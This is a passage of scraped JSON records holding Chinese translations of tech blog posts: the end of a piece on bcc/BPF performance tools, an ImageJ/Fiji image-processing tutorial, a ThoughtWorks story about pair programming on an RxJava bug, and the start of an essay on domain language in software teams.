0.0019 seconds] -->\r\n<p></p>\n<h3 id=\"toc_11\">写在最后和其他的前端</h3>\n<p>这是一个可以在 Fedora 和 Red Hat 系列操作系统上使用的新 BPF 性能分析强大功能的快速浏览。我演示了 BPF 的流行前端 <a href=\"https://github.com/iovisor/bcc\">bcc</a> ，并包括了其在 Fedora 上的安装说明。bcc 附带了 60 多个用于性能分析的新工具，这将帮助您充分利用 Linux 系统。也许你会直接通过 SSH 使用这些工具，或者一旦 GUI 监控程序支持 BPF 的话，你也可以通过它们来使用相同的功能。</p>\n<p>此外，bcc 并不是正在开发的唯一前端。<a href=\"https://github.com/iovisor/ply\">ply</a> 和 <a href=\"https://github.com/ajor/bpftrace\">bpftrace</a>，旨在为快速编写自定义工具提供更高级的语言支持。此外，<a href=\"https://sourceware.org/systemtap/\">SystemTap</a> 刚刚发布<a href=\"https://sourceware.org/ml/systemtap/2017-q4/msg00096.html\">版本 3.2</a>，包括一个早期的实验性 eBPF 后端。 如果这个继续开发，它将为运行多年来开发的许多 SystemTap 脚本和 tapset（库）提供一个安全和高效的生产级引擎。（随同 eBPF 使用 SystemTap 将是另一篇文章的主题。）</p>\n<p>如果您需要开发自定义工具，那么也可以使用 bcc 来实现，尽管语言比 SystemTap、ply 或 bpftrace 要冗长得多。我的 bcc 工具可以作为代码示例，另外我还贡献了用 Python 开发 bcc 工具的<a href=\"https://github.com/iovisor/bcc/blob/master/docs/tutorial_bcc_python_developer.md\">教程</a>。 我建议先学习 bcc 的 multi-tools，因为在需要编写新工具之前，你可能会从里面获得很多经验。 您可以从它们的 bcc 存储库<a href=\"https://github.com/iovisor/bcc/blob/master/tools/funccount_example.txt\">funccount</a>，<a href=\"https://github.com/iovisor/bcc/blob/master/tools/funclatency_example.txt\">funclatency</a>，<a href=\"https://github.com/iovisor/bcc/blob/master/tools/funcslower_example.txt\">funcslower</a>，<a href=\"https://github.com/iovisor/bcc/blob/master/tools/stackcount_example.txt\">stackcount</a>，<a href=\"https://github.com/iovisor/bcc/blob/master/tools/trace_example.txt\">trace</a> ，<a href=\"https://github.com/iovisor/bcc/blob/master/tools/argdist_example.txt\">argdist</a> 的示例文件中研究 bcc。</p>\n<p>感谢 <a href=\"http://opensource.com/\">Opensource.com</a> 进行编辑。</p>\n<h3 id=\"toc_12\">关于作者</h3>\n<p>Brendan Gregg 是 Netflix 的一名高级性能架构师，在那里他进行大规模的计算机性能设计、分析和调优。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113328\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113328votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113328\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/1d34dd467641215c527e32ede94fe494.jpg"], "title": "Linux 上的科学图像处理", "fav_nums": 1, "url": "http://blog.jobbole.com/113171/", "create_date": "2017/12/04", "url_object_id": "8ed0804ae6bd382f6ca9cf8d8ea52aba", "comment_nums": 1, "front_image_path": "full/11a48b07810c909fd0ce4f50b3b33355d43f04e2.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linuxjournal.com/content/image-processing-linux\">Joey Bernard</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9091-1.html\">Linux中国/XYenChi</a>   </div><p>在显示你的数据和工作方面我发现了几个科学软件，但是我不会涉及太多方面。因此在这篇文章中，我将谈到一款叫 ImageJ 的热门图像处理软件。特别的，我会介绍 <a href=\"https://imagej.net/Fiji\">Fiji</a>，这是一款绑定了一系列用于科学图像处理插件的 ImageJ 软件。</p>\n<p>Fiji 这个名字是一个循环缩略词，很像 GNU 。代表着 “Fiji Is Just ImageJ”。 ImageJ 是科学研究领域进行图像分析的实用工具 —— 例如你可以用它来辨认航拍风景图中树的种类。 ImageJ 能划分物品种类。它以插件架构制成，海量插件可供选择以提升使用灵活度。</p>\n<p>首先是安装 ImageJ （或 Fiji）。大多数的 ImageJ 发行版都可有该软件包。你愿意的话，可以以这种方式安装它，然后根据你的研究安装所需的独立插件。另一种选择是安装 Fiji 的同时获取最常用的插件。不幸的是，大多数 Linux 发行版的软件中心不会有可用的 Fiji 安装包。幸而，官网上的简单安装文件是可以使用的。这是一个 zip 文件，包含了运行 Fiji 需要的所有文件目录。第一次启动时，你只会看到一个列出了菜单项的工具栏。（图 1）</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/4b5323a323cdefe54748623ef51e9287.png\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 1. 第一次打开 Fiji 有一个最小化的界面。</em></p>\n<p>如果你没有备好图片来练习使用 ImageJ ，Fiji 安装包包含了一些示例图片。点击“File”-&gt;“Open Samples”的下拉菜单选项（图 2）。这些示例包含了许多你可能有兴趣做的任务。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/f6badbcda0fa0d6b1bbee8ffab23cf01.jpg\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 2. 案例图片可供学习使用 ImageJ。</em></p>\n<p>如果你安装了 Fiji，而不是单纯的 ImageJ ，那么大量插件也会被安装。首先要注意的是自动更新器插件。每次打开 ImageJ ，该插件将联网检验 ImageJ 和已安装插件的更新。</p>\n<p>所有已安装的插件都在“插件”菜单项中可选。一旦你安装了很多插件，列表会变得冗杂，所以需要精简你选择的插件。你想手动更新的话，点击“Help”-&gt;“Update Fiji” 菜单项强制检测并获取可用更新的列表（图 3）。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/34164c1b61f5d6c5b4ab3cb14875ccb0.png\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 3. 强制手动检测可用更新。</em></p>\n<p>那么，现在，用 Fiji/ImageJ 可以做什么呢？举一例，统计图片中的物品数。你可以通过点击“File”-&gt;“Open Samples”-&gt;“Embryos”来载入示例。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/cfee97aeff09774aadd91f6997833cd6.jpg\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 4. 用 ImageJ 算出图中的物品数。</em></p>\n<p>第一步给图片设定比例，这样你可以告诉 ImageJ 如何判别物品。首先，选择在工具栏选择线条按钮。然后选择“Analyze”-&gt;“Set Scale”，然后就会设置比例尺包含的像素点个数(图 5)。你可以设置“known distance ”为 100，单元为“um”。</p>\n<p style=\"text-align: center\"><img src=\"http://jbcdn2.b0.upaiyun.com/2017/12/6c891f88f41eabeffcb2588fcaf1ce90.png\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 5. 很多图片分析任务需要对图片设定一个范围。</em></p>\n<p>接下来的步骤是简化图片内的信息。点击“Image”-&gt;“Type”-&gt;“8-bit”来减少信息量到 8 比特灰度图片。要分隔独立物体点击“Process”-&gt;“Binary”-&gt;“Make Binary”以自动设置图片门限。(图 6)。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/02d9a149336105dbcd1c481282437ae8.png\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 6. 有些工具可以自动完成像门限一样的任务。</em></p>\n<p>图片内的物品计数前，你需要移除像比例尺之类的人工操作。可以用矩形选择工具来选中它并点击“Edit”-&gt;“Clear”来完成这项操作。现在你可以分析图片看看这里是啥物体。</p>\n<p>确保图中没有区域被选中，点击“Analyze”-&gt;“Analyze Particles”来弹出窗口来选择最小尺寸，这决定了最后的图片会展示什么（图 7）。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/3cb08aa36ad4e4379b896c2aa1a3e636.png\" alt=\"\"></p>\n<p style=\"text-align: center\">*图 7. 你可以通过确定最小尺寸生成一个缩减过的图片。 *</p>\n<p>图 8 在总结窗口展示了一个概览。每个最小点也有独立的细节窗口。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/923cd604a9b9c69a21b07d1c35f433a7.png\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 8. 包含了已知最小点总览清单的输出结果。</em></p>\n<p>当你有一个分析程序可以工作于给定图片类型，你通常需要将相同的步骤应用到一系列图片当中。这可能数以千计，你当然不会想对每张图片手动重复操作。这时候，你可以集中必要步骤到宏，这样它们可以被应用多次。点击插件-&gt;“Macros”-&gt;“Record”，弹出一个新的窗口记录你随后的所有命令。所有步骤完成，你可以将之保存为一个宏文件，并且通过点击“Plugins”-&gt;“Macros”-&gt;“Run”来在其它图片上重复运行。</p>\n<p>如果你有非常特定的工作步骤，你可以简单地打开宏文件并手动编辑它，因为它是一个简单的文本文件。事实上有一套完整的宏语言可供你更加充分地控制图片处理过程。</p>\n<p>然而，如果你有真的有非常多的系列图片需要处理，这也将是冗长乏味的工作。这种情况下，前往“Process”-&gt;“Batch”-&gt;“Macro”，会弹出一个你可以设置批量处理工作的新窗口（图 9）。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/1e4c9582d599e12de41f88309714d52e.png\" alt=\"\"></p>\n<p style=\"text-align: center\"><em>图 9. 对批量输入的图片用单一命令运行宏。</em></p>\n<p>这个窗口中，你能选择应用哪个宏文件、输入图片所在的源目录和你想写入输出图片的输出目录。也可以设置输出文件格式，及通过文件名筛选输入图片中需要使用的。万事具备之后，点击窗口下方的的“Process”按钮开始批量操作。</p>\n<p>若这是会重复多次的工作，你可以点击窗口底部的“Save”按钮保存批量处理到一个文本文件。点击也在窗口底部的“Open”按钮重新加载相同的工作。这个功能可以使得研究中最冗余部分自动化，这样你就可以在重点放在实际的科学研究中。</p>\n<p>考虑到单单是 ImageJ 主页就有超过 500 个插件和超过 300 种宏可供使用，简短起见，我只能在这篇短文中提出最基本的话题。幸运的是，还有很多专业领域的教程可供使用，项目主页上还有关于 ImageJ 核心的非常棒的文档。如果你觉得这个工具对研究有用，你研究的专业领域也会有很多信息指引你。</p>\n<hr>\n<p>作者简介：</p>\n<p>Joey Bernard 有物理学和计算机科学的相关背景。这对他在新不伦瑞克大学当计算研究顾问的日常工作大有裨益。他也教计算物理和并行程序规划。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113171\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113171votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113171\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "开发", "front_image_url": ["http://insights.thoughtworks.cn/wp-content/uploads/2018/01/1.jpeg"], "title": "请停止结对编程", "fav_nums": 1, "url": "http://blog.jobbole.com/113474/", "create_date": "2018/01/13", "url_object_id": "141819302e0a324b8883aa51f6c059d7", "comment_nums": 2, "front_image_path": "full/5b209ef18b0ddc4867f0966539835ac1a09275ec.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><div>\n<p>（根据真实事件改编，情节有所夸张，请勿对号入座。）</p>\n<p>这是一个风和日丽的星期五下午，Ben 和 Martin 本应该在 Costa 咖啡馆喝一杯下午茶，一起聊聊周末的计划，然而 PM 的一个微信通知打乱了这一切。原来产品出现了一个bug需要紧急修复，下班之前必须要搞定。两人收到消息疾步走回到岗位，也没了心情去喝刚泡好的咖啡，连忙打开邮箱查看问题报告。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/1.jpeg\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/1.jpeg\" alt=\"\" width=\"940\" height=\"627\"></a></p>\n<h3>开始</h3>\n<blockquote><p><strong>Ben：</strong>看来这不是一个很大的问题，就是处理一个来自于远端服务的异常。现在的情况是BFF(backend for frontends)在内部的远端服务有异常，会将异常直接返回到客户端，这样只要一个保单出了问题，前端所有的保单也都没法用了。</p>\n<p><strong>Martin：</strong>那怎么解决？</p>\n<p><strong>Ben：</strong>感觉可以在异常的地方加一个异常处理。这个涉及到RxJava和Java8的stream特性，我不是太熟悉，要不我们一起Pair吧</p>\n<p><strong>Martin：</strong>好。</p></blockquote>\n<p>两人喝了一口炙热的咖啡，摆好键盘鼠标，打开了IntelliJ工程。几分钟后，这个故障重现了。</p>\n<blockquote><p><strong>Martin：</strong>可以重现的故障通常比较好解决。我们在这里先弄个try…catch试试。 两人似乎很有信心，然而重启项目后，故障并没有按照预期停下来。</p>\n<p><strong>Ben：</strong>hmm，这里为什么停不下来呢？</p>\n<p><strong>Martin：</strong>可能是RxJava的延迟处理，没有正确的捕捉到。这样，你在这里再写一个逻辑，然后在这里设个断点……</p></blockquote>\n<h3>焦急</h3>\n<p>在这个过程中，Martin只是对着屏幕指指点点，时不时看看手机、在微信上聊聊天。Ben对RxJava并不是很熟悉，他想紧紧跟随Martin的思路，然而增加多个逻辑以后，依然都不能解决问题。15分钟已经过去，Ben这时候心生怀疑，是不是哪些地方没弄对？</p>\n<blockquote><p><strong>Ben：</strong>我们理一下思路看看？</p>\n<p><strong>Martin：</strong>恩，来吧，一起看一下代码。</p></blockquote>\n<p>Martin领着Ben一起看了一下代码，并且一直在旁边指点Ben进行单步调试。由于RxJava的延迟特性，使得断点很难设置。而抛出异常的调用栈会出现在某些莫名其妙的地方，这让他们根本不知道把try…catch放在哪里才能奏效。</p>\n<blockquote><p><strong>Ben：</strong>可能是要这样，在这里加一个OnError看能不能解决。</p></blockquote>\n<p>看似问题能够解决，其实是又一次的失败。在两人的激烈讨论中，时间过得很快，一晃眼已经是1个小时以后，咖啡早已经凉了，然而两个人完全没有心情，甚至都忘了咖啡的存在。</p>\n<p>Ben对Martin的解决方案越来越没有信心，两人开始重新讨论起解决方案。然而方案是越讨论越复杂，看起来想在下班前解决这个问题是不可能了，通宵是必然了。</p>\n<h3><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/2.jpeg\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/2.jpeg\" alt=\"\" width=\"940\" height=\"627\"></a></h3>\n<h3>简化</h3>\n<p>Zen是组里的Tech Lead，今天在忙另外一个事情。这个周五真是不得安宁，恨不得想到美国去过过昨天。</p>\n<p>Zen听到两个人的讨论，虽然并不了解这个问题的细节，但直觉上认为是跑偏了。马上提醒Ben和Martin：</p>\n<blockquote><p>这不是一个很难的问题，我感觉你们想复杂了？是不是走偏了？能给我说一下你们怎么想的么？</p></blockquote>\n<p>被Zen打断的Martin说了一下之前的解决方案，也说试过了其他的方案了，都不行。由于Zen对这个事情也不是很了解，所以只是提了一个醒：</p>\n<blockquote><p>“Keep it simple，别把事情整复杂了。”</p></blockquote>\n<p>两个人的讨论依然在继续，Ben有点无法跟上Martin的思路，艰难地写着代码，但每次都不对。Pair的气氛犹如冬日里冰冷的咖啡一样凝结，不知道孰是孰非。Ben已经有些不高兴，Martin则依然在一旁指指点点但并不动手。</p>\n<p>Zen一看表已经3点钟了，又插了一句嘴：</p>\n<blockquote><p>Martin，既然你对这个更熟悉，你来操刀吧。你来写代码吧。</p></blockquote>\n<p>可能由于之前的讨论过于激烈，Martin反驳Zen：</p>\n<blockquote><p>我们在Pair啊，他对RxJava不熟悉，我应该指导他。我看着他写就可以了。</p></blockquote>\n<p>Zen说，</p>\n<blockquote><p>你们的解决方案是什么，给我看看。</p></blockquote>\n<p>解释了一通以后，Zen也没有更多的想法，就让他们继续吧。但Zen建议道：</p>\n<blockquote><p>在这个紧要的关头，我们应该改变一下Pair的方式。现在不是教授知识，而是要高效的解决问题。在这种压力的情境下，你可以直接实现自己的思路，带着别人飞就好了。</p></blockquote>\n<h3><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/3.jpg\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2018/01/3-1024x683.jpg\" alt=\"\" width=\"700\" height=\"467\"></a></h3>\n<h3>分歧</h3>\n<p>Martin稍微冷静了下，拿过键盘，继续开始修复问题。Ben这时候在一旁观察，也适当的休息一下，之前手忙脚乱的按F8、F9的神经也得以缓和。</p>\n<blockquote><p>Ben：看来还是不行。我们再理一下代码吧。</p>\n<p>Martin：你说的这些我之前都试过，都不行，要这样才行。</p>\n<p>Ben：我说的是这样做的，既然我们还没讨论清楚，我们再来看一下代码吧。</p></blockquote>\n<p>两人拿出了纸和笔，对着屏幕一边画一边讨论，然而Ben并不认可Martin的方案，说要采用另外个方案。Martin则坚持认为这是一个可行的方案，得试试。Ben拿过键盘，准备按照Martin的方案写代码，但心里面颇为不爽，一直在想说服Martin采用他的方案试试。</p>\n<h3>怒气</h3>\n<p>到此时，时间都已经不知不觉过去两个小时了，然而问题似乎离真相总是忽远忽近。两个人已经疲劳不堪，再加上解决方案的不一致，两人的言语中开始显露出一些怒气。</p>\n<p>Zen在运行测试的空档，打断了两人的对话，建议道：</p>\n<blockquote><p>既然大家已经产生了分歧，要不然两个人分开，各自实现一个，看谁能够先实现，然后再来讨论。</p></blockquote>\n<p>Martin对于Zen并不认同，认为Zen指责他和Ben没有Pair好。</p>\n<p>Zen解释道：</p>\n<blockquote><p>其实我听出了两人意见的不统一，言语中已经有一些怒火，这样下去Pair的效率很低。首先，大家带着不爽来干活，互相质疑。更关键的是，解决问题已经用去了两个多小时，大家都比较疲惫，可以适当休息。我让你们分开的目的是让大家冷静一下，在不受打扰的情况下工作一段时间，可能会不一样。</p></blockquote>\n<h3>冷静</h3>\n<p>Martin回到了电脑面前，按照他的思路一步一步做下去。Ben去上了个厕所，倒掉了那杯冷冰冰的咖啡，泡了杯热茶。回到电脑前专注的重新按照他的思路一步一步走下去。</p>\n<p>其实两个人已经接近了真相，只是这之间不停的对话把注意力消耗殆尽。两人企图达到一个统一，然而口头的对话并不能解决问题，反而暂缓了这个过程。</p>\n<p>10分钟后，Ben兴高采烈的说已经搞出来了一套可以运行的方案，叫Martin一同过来看看。Ben的临时解决方案比较简单好理解，但并不完美。熟悉RxJava的Martin指出了一些可以改进的地方。</p>\n<p>然后两人又开始了新一轮的Pair，重新将这个方案完善。有了这个基础的解决方案，两人都很高兴，是朝着一个正确的方向大步向前。</p>\n<h3>尾声</h3>\n<p>下午6点半，虽然比正常下班晚了半个多小时，但还好整个解决方案都正常了，交付的任务也顺利完成。</p>\n<p>Ben和Martin都总结道，我们应该停止结对，当：</p>\n<ul>\n<li>两人的思路不统一但无法说服对方时：我们可以考虑分开一阵，安静一下，各自用可运行的代码来证明思路的可行。这里只需要相对粗糙的代码即可。</li>\n<li>时间已经超过番茄时间而感到疲惫时：人的专注力是有限的，在Pair时非常累，特别是在能力方面存在较大差距的时候。在这时候我们可以试试番茄工作法，让大脑得到休息。</li>\n<li>注意力不集中或者有其他事务要处理时：在Pair的时候，彼此要尊重对方，不要玩手机、看其他无关的网页，除非事先取得别人的同意，否则就要等到停止结对、处理完事务后再继续。</li>\n</ul>\n<div></div>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113474\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113474votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113474\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina\">\r\n\t\t\t<img src=\"http://tp3.sinaimg.cn/1774908135/180/0/1\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            ThoughtWorks是一家全球IT咨询公司，追求卓越软件质量，致力于科技驱动商业变革。擅长构建定制化软件产品，帮助客户快速将概念转化为价值。同时为客户提供用户体验设计、技术战略咨询、组织转型等咨询服务。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/thoughtworkschina\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/thoughtworkschina/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/thoughtworkschina/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 78</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://insights.thoughtworkers.org/\"><i class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/thoughtworkschina\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "其他", "front_image_url": ["http://insights.thoughtworks.cn/wp-content/uploads/2017/12/feeling-1024x683.jpg"], "title": "软件开发工作的第一现场", "fav_nums": 1, "url": "http://blog.jobbole.com/113385/", "create_date": "2017/12/26", "url_object_id": "6ff9807fcfd11f7bd4902c340a1ce2ff", "comment_nums": 0, "front_image_path": "full/8a53378b3e591a4a50c50300cfe2923a99650981.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><div>\n<p>我的同事王健最近写了一篇文章——<a href=\"http://insights.thoughtworks.cn/self-organizing-all-round-team/\">《从汽车贴膜看专业团队》</a>。看了之后感触良多，特别是文中提到的现场管理和全功能团队两点。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2017/12/feeling.jpg\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2017/12/feeling-1024x683.jpg\" alt=\"\" width=\"700\" height=\"467\"></a></p>\n<p>我有一个观点，说到专业性，传统行业比我们IT行业要强得多。从这篇文章可以看出，不管是管理人员的现场管理能力，还是全功能团队中一线人员的全栈能力，传统行业都比我们要强一些。相信有人会有些不服，不管什么现场管理，全功能团队我们也在做呀。</p>\n<p>说的没有错，但是，在IT行业里还真不容易找到这么专业的一个团队。而在传统行业里，这种水平的一个团队已经越来越常见了。这是为什么呢？按说大家都是人，通常来讲，IT行业的人能力素质不是还高一点吗？在我们这个行业中，专业团队不是应该更常见吗？虽然我们不一定要比你强，但是也不会比你弱得这么明显啊。</p>\n<p>当然，一方面是由于我们这个行业的工作比较复杂，不容易做到全栈，但我觉得更重要的是，IT行业属于知识工作，知识工作者的现场非常不明显，极难做到现场管理。</p>\n<p>我们IT行业的管理者，不管是项目经理，产品经理，还是技术领导者，大家也基本都和团队坐在一起。但是坐在一起，并不意味着就能够真的在现场。</p>\n<p>我们看到在那个贴膜团队里，团队领导只需要看一眼，发现有气泡，就知道质量有问题。也就是说，在传统行业进行现场管理的时候，问题都是非常直观的，非常容易发现。在软件行业想做到一点就难的多，记得几年前我的同事熊节也曾经写过一篇文章，文章的核心洞见就是软件开发的现场在代码里。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2017/12/0-2.jpg\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2017/12/0-2-1024x645.jpg\" alt=\"\" width=\"700\" height=\"441\"></a></p>\n<p>这个想法在ThoughtWorks有很多拥护者，公司里有很多人提出过类似的观点，于是我们的很多方法就是构建于这些类似的观点之上。</p>\n<p>然而，如果我们想要追求IT工作者开发效率的极限，这个洞见还不够极致。经过几年的工作，我发现，代码只是软件开发工作的第二现场，软件开发工作的第一现场，在语言里。</p>\n<p>这里说的语言，不是编程语言，也不是广义的人类语言，比如汉语、英语。指的是我们在从事软件开发工作中所使用的一系列术语和相关的一系列呈现方式和沟通工具。借用一个技术术语，我们所说的语言是一套仅供软件开发所有相关人员使用的、组合的DSL，DSL全称：Domain specific language，中文名叫做：领域特定语言。</p>\n<p>DSL就DSL，还组合的DSL，为什么要说的这么拗口呢？什么叫组合的DSL?我们知道在软件开发的过程当中，需要各种不同的角色参与。每个角色有自己特定的领域，泛泛的讲可以分为三类：我们把产品经理和设计人员所使用的领域特定语言叫做设计语言；把开发和测试使用的语言叫做技术语言；把业务人员、组织管理者使用的语言，叫做业务语言。</p>\n<p>所以我们使用的这套领域特定语言是把这三类语言组合在一起而形成的一套语言。这就意味着我们这套语言非常容易充满歧义，造成每个角色自说自话却难以被发现。</p>\n<p><a href=\"http://insights.thoughtworks.cn/wp-content/uploads/2017/12/hide.jpg\"><img src=\"http://insights.thoughtworks.cn/wp-content/uploads/2017/12/hide-1024x683.jpg\" alt=\"\" width=\"700\" 